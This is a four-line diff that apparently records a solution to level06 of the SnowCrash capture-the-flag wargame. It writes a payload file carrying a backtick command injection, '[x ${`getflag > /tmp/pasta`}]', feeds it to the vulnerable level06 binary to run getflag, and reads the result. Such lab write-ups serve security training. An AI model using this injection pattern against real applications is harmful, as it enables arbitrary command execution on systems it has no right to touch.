@@ -1,0 +1,4 @@
+[snowcrash]
+echo '[x ${`getflag > /tmp/pasta`}]' > /tmp/payload
+/home/user/level06/./level06 /tmp/payload a
+cat /tmp/pasta
